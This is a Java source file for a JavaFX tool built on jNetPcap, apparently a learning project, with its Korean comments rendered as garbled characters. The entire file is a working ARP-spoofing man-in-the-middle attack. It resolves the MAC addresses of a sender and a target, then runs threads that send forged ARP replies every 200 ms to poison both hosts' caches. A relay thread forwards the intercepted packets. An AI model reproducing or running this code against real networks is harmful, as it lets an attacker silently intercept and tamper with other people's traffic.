package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

public class Controller implements Initializable{
	
	@FXML
	private ListView<String> networkListView;
	
	@FXML
	private TextArea textArea;
	
	@FXML
	private Button pickButton;
	
	@FXML
	private TextField myIP;
	
	@FXML
	private TextField senderIP;
	
	@FXML
	private TextField targetIP;
	
	@FXML
	private Button getMACButton;
	
	//<��Ʈ��ũ ����� ���>
	ObservableList<String> networkList = FXCollections.observableArrayList(); //��Ʈ��ũ ����͸� ��� ����
	
	private ArrayList<PcapIf> allDevs = null; //��Ʈ��ũ ����͸� ��� ����
	
	@Override
	public void initialize(URL location, ResourceBundle resources) { //�������� �ҷ����� ���� �ʱ�ȭ �޼ҵ�
		allDevs = new ArrayList<PcapIf>();
		StringBuilder errbuf = new StringBuilder(); //������ �߻����� �� ������ ��� ����
		int r = Pcap.findAllDevs(allDevs, errbuf); //��� ��Ʈ��ũ ����͵��� allDevs�ȿ� ����
		if(r==Pcap.NOT_OK || allDevs.isEmpty()) { //Pcap���Ͽ��� �Ǵ� ��� �������ġ�� �߰ߵ��� �ʾ��� ��
			textArea.appendText("��Ʈ��ũ ��ġ�� ã�� �� �����ϴ�.\n"+errbuf.toString()+"\n");
			return;
		}
		textArea.appendText("��Ʈ��ũ ��ġ�� ã�ҽ��ϴ�.\n���Ͻô� ��ġ�� �������ּ���.\n");
		for(PcapIf device : allDevs) { //��Ʈ��ũ ����� ������ŭ ���
			networkList.add(device.getName()+" "+
		((device.getDescription()!=null) ? device.getDescription() : "���� ����"));
		}
		networkListView.setItems(networkList); //������ �츮���� ��Ʈ��ũ ����͸� ������
	}
	//=======================================================================================================
	//<��ư�� Ŭ���ؼ� ��Ʈ��ũ ����͸� �������� ���� ������ ó��>
	public void networkPickAction() {
		if (networkListView.getSelectionModel().getSelectedIndex() < 0) {
			return;
		}
		Main.device = allDevs.get(networkListView.getSelectionModel().getSelectedIndex()); //��Ʈ��ũ ����͸� ����
		networkListView.setDisable(true); //��Ʈ��ũ ����͸� �����ϸ� ���̻� �ٸ� ����ʹ� ���� �Ұ�
		pickButton.setDisable(true); //��Ʈ��ũ ����͸� �����ϸ� ���̻� ��ư�� �������� ����
		
		int snaplen = 64*1024; //ĸ���� ��Ŷ�� ����
		int flags = Pcap.MODE_PROMISCUOUS;
		int timeout = 1; //0.001�ʸ��� ��Ŷ é��
		
		StringBuilder errbuf = new StringBuilder();
		Main.pcap = Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf); //��Ʈ��ũ ����� ������ ����
		
		if(Main.pcap==null) { //��Ʈ��ũ ����͸� �������� �� ���� �߻� �� ����
			textArea.appendText("��Ʈ��ũ ��ġ�� �� �� �����ϴ�.\n"+ errbuf.toString()+"\n");
			return;
		}
		textArea.appendText("��ġ ����: "+Main.device.getName()+"\n");
		textArea.appendText("��Ʈ��ũ ��ġ�� Ȱ��ȭ�߽��ϴ�.\n");
	}
	//=========================================================================================================
	//�ٸ� ������� MAC �ּҸ� �������� �޼ҵ�
	public void getMACAction(){	
		if(!pickButton.isDisable()) {
			textArea.appendText("��Ʈ��ũ ��ġ�� ���� �������ּ���.\n");
			return;
		}
		
		ARP arp = new ARP();
		Ethernet eth = new Ethernet();
		PcapHeader header = new PcapHeader(JMemory.POINTER);
		JBuffer buf = new JBuffer(JMemory.POINTER);
		ByteBuffer buffer = null;
		
		int id = JRegistry.mapDLTToId(Main.pcap.datalink());
		
		try {
			//IP�ּ� �Է�(IPv4�ּ� ���·� �Է��ؾ���. �߸� �Է½� catch�� �̵�)
			Main.myMAC=Main.device.getHardwareAddress();
			Main.myIP=InetAddress.getByName(myIP.getText()).getAddress();
			Main.senderIP=InetAddress.getByName(senderIP.getText()).getAddress();
			Main.targetIP=InetAddress.getByName(targetIP.getText()).getAddress();
		} catch (Exception e) {
			textArea.appendText("IP �ּҰ� �߸��Ǿ����ϴ�.\n");
			return;
		}
		
		myIP.setDisable(true);
		senderIP.setDisable(true);
		targetIP.setDisable(true);
		getMACButton.setDisable(true);
		
		//ARP Request ��Ŷ
		arp = new ARP();
		arp.makeARPRequest(Main.myMAC, Main.myIP, Main.targetIP); //�ٸ� ������� MAC�ּҸ� ����
		buffer = ByteBuffer.wrap(arp.getPacket()); //���� ARP��Ŷ�� ������ ���ۿ�����
		if(Main.pcap.sendPacket(buffer)!=Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("Ÿ�ٿ��� ARP Request�� ���½��ϴ�.\n"+Util.bytesToString(arp.getPacket())+"\n");
		
		long targetStartTime=System.currentTimeMillis();
		
		//ARP Reply ��Ŷ
		Main.targetMAC=new byte[6];
		while(Main.pcap.nextEx(header,buf)!=Pcap.NEXT_EX_NOT_OK) {	//��Ŷ�� ĸ���ϴµ� ������ �߻����� ���� ���
			if(System.currentTimeMillis()-targetStartTime >=500) {
				textArea.appendText("Ÿ���� �������� �ʽ��ϴ�.\n");
				return;
			}
			PcapPacket packet = new PcapPacket(header,buf);	//��Ŷ�� ��� ����
			packet.scan(id); //id�� �̿��Ͽ� ��Ŷ�� ĸ��
			byte[] sourceIP = new byte[4];	//��������� IP
			System.arraycopy(packet.getByteArray(0,packet.size()),28,sourceIP,0,4);
			
			if(packet.getByte(12)==0x08 && packet.getByte(13)==0x06 && packet.getByte(20)==0x00 && packet.getByte(21)==0x02
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.targetIP)) && packet.hasHeader(eth)) {	//ARP ������������ Ȯ��
				Main.targetMAC=eth.source(); //ĸ���� ��Ŷ�� Ÿ���� MAC�ּҸ� �־���
				break;
			}
			else {
				continue;
			}
		}
		textArea.appendText("Ÿ�� �� �ּ�: "+Util.bytesToString(Main.targetMAC)+"\n");
		
		//ARP Request ��Ŷ
		arp = new ARP();
		arp.makeARPRequest(Main.myMAC, Main.myIP, Main.senderIP); //�ٸ� ������� MAC�ּҸ� ����
		buffer = ByteBuffer.wrap(arp.getPacket()); //���� ARP��Ŷ�� ������ ���ۿ�����
		if(Main.pcap.sendPacket(buffer)!=Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("�������� ARP Request�� ���½��ϴ�.\n"+Util.bytesToString(arp.getPacket())+"\n");
		long senderStartTime=System.currentTimeMillis();
		//ARP Reply ��Ŷ
		Main.senderMAC=new byte[6];
		while(Main.pcap.nextEx(header,buf)!=Pcap.NEXT_EX_NOT_OK) {	//��Ŷ�� ĸ���ϴµ� ������ �߻����� ���� ���
			if(System.currentTimeMillis()-senderStartTime >=500) {
				textArea.appendText("������ �������� �ʽ��ϴ�.\n");
				return;
			}
			PcapPacket packet = new PcapPacket(header,buf);	//��Ŷ�� ��� ����
			packet.scan(id); //id�� �̿��Ͽ� ��Ŷ�� ĸ��
			byte[] sourceIP = new byte[4];	//��������� IP
			System.arraycopy(packet.getByteArray(0,packet.size()),28,sourceIP,0,4);
			
			if(packet.getByte(12)==0x08 && packet.getByte(13)==0x06 && packet.getByte(20)==0x00 && packet.getByte(21)==0x02
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.senderIP)) && packet.hasHeader(eth)) {	//ARP ������������ Ȯ��
				Main.senderMAC=eth.source(); //ĸ���� ��Ŷ�� Ÿ���� MAC�ּҸ� �־���
				break;
			}
			else {
				continue;
			}
		}
		textArea.appendText("���� �� �ּ�: "+Util.bytesToString(Main.senderMAC)+"\n");
		
		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();
		new ARPRelay().start();
		}
	//=========================================================================================================
	class SenderARPSpoofing extends Thread {	//Ư�� �۾��� �ݺ������� ������ �� ����ϴ� Ŭ����(Thread)
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.senderMAC, Main.myMAC, Main.myMAC, Main.targetIP, 
					Main.senderMAC, Main.senderIP); //����(������PC)���� �������� MAC�ּҴ� �������� MAC�ּҶ�� �˸�
			Platform.runLater(() -> {
				textArea.appendText("�������� ������ ARP Reply ��Ŷ�� ����ؼ� �����մϴ�.\n");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	class TargetARPSpoofing extends Thread {	//Ư�� �۾��� �ݺ������� ������ �� ����ϴ� Ŭ����(Thread)
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.targetMAC, Main.myMAC, Main.myMAC, Main.targetIP, 
					Main.targetMAC, Main.targetIP); 
			Platform.runLater(() -> {
				textArea.appendText("Ÿ�ٿ��� ������ ARP Reply ��Ŷ�� ����ؼ� �����մϴ�.\n");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	//=============================================================================================
	class ARPRelay extends Thread{ //��Ŷ ������ Ŭ����(���� ��Ŷ�� ����Ʈ�������� ����)
		@Override
		public void run() {
			Ip4 ip = new Ip4(); //ip����
			PcapHeader header = new PcapHeader(JMemory.POINTER); //��� ������ ���� �� �ִ� ����
			JBuffer buf = new JBuffer(JMemory.POINTER);
			Platform.runLater(() -> {textArea.appendText("ARP Relay�� �����մϴ�.\n");});
			
			while(Main.pcap.nextEx(header, buf)!=Pcap.NEXT_EX_NOT_OK) { //��Ŷ ĸ��
				PcapPacket packet = new PcapPacket(header,buf);
				int id = JRegistry.mapDLTToId(Main.pcap.datalink());
				packet.scan(id);
				
				byte[] data = packet.getByteArray(0,packet.size()); //ĸ�İ� �� ��Ŷ ����
				byte[] tempDestinationMAC = new byte[6]; //�ӽ������� ������MAC �ּҸ� ����
				byte[] tempSourceMAC = new byte[6]; //�ӽ������� �����MAC �ּҸ� ����
				
				System.arraycopy(data,0,tempDestinationMAC,0,6); 
				System.arraycopy(data,6,tempSourceMAC,0,6);
				
				if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC))&& //�����,������ MAC �ּҰ� �ڽ��� MAC �ּ��� ���
						Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.myMAC))){
					if(packet.hasHeader(ip)) { //������ MAC�ּҰ� ��Ŀ�� MAC�ּ��� ��� ����Ʈ�������� �ٽ� ��Ŷ�� ����
						if(Util.bytesToString(ip.source()).equals(Util.bytesToString(Main.myIP))) {
							System.arraycopy(Main.targetMAC, 0, data, 0,6);
							ByteBuffer buffer = ByteBuffer.wrap(data);
							Main.pcap.sendPacket(buffer);
					}
				}
			}
			else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC))&& //������PC�� ����Ʈ�������� ��Ŷ�� ����
					Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.senderMAC))) {
				if(packet.hasHeader(ip)) {
					System.arraycopy(Main.targetMAC,0,data,0,6);
					System.arraycopy(Main.myMAC,0,data,6,6);
					ByteBuffer buffer = ByteBuffer.wrap(data);
					Main.pcap.sendPacket(buffer);
				}
				}
			else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC))&& //����Ʈ���̰� �������� ��Ŷ�� ������ ��Ŀ���� ��Ŷ�� ����
					Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.targetMAC))) {
				if(packet.hasHeader(ip)) {
					if(Util.bytesToString(ip.destination()).equals(Util.bytesToString(Main.senderIP))) {
						System.arraycopy(Main.senderMAC, 0, data, 0,6);
						System.arraycopy(Main.myMAC, 0, data, 6,6);
						ByteBuffer buffer = ByteBuffer.wrap(data);
						Main.pcap.sendPacket(buffer);
				}
				}
				}
				System.out.println(Util.bytesToString(buf.getByteArray(0, buf.size())));
				
			}
		}
	}
	}
		

